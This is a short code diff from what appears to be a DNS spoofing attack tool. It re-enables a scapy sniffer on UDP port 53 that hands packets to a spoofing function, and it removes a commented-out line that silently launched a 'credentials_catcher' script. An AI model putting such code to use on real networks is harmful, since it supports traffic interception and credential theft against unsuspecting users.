@@ -16,6 +16,4 @@ def launch_dns_spoofer(pkt):
 def dns_sniffer():
     iface = str(ATTACK_STATUS['iface'])
     print("Starting DNS sniffer")
-    #sys.sleep(1)
-    #process = subprocess.Popen(["python3", "corethreads/credentials_catcher.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    #sniff(filter="udp port 53", prn= lambda pkt : launch_dns_spoofer(pkt), iface=iface) #udp port 53 for DNS requests #pkt is the received packet by sniff
+    sniff(filter="udp port 53", prn= lambda pkt : launch_dns_spoofer(pkt), iface=iface) #udp port 53 for DNS requests #pkt is the received packet by sniff
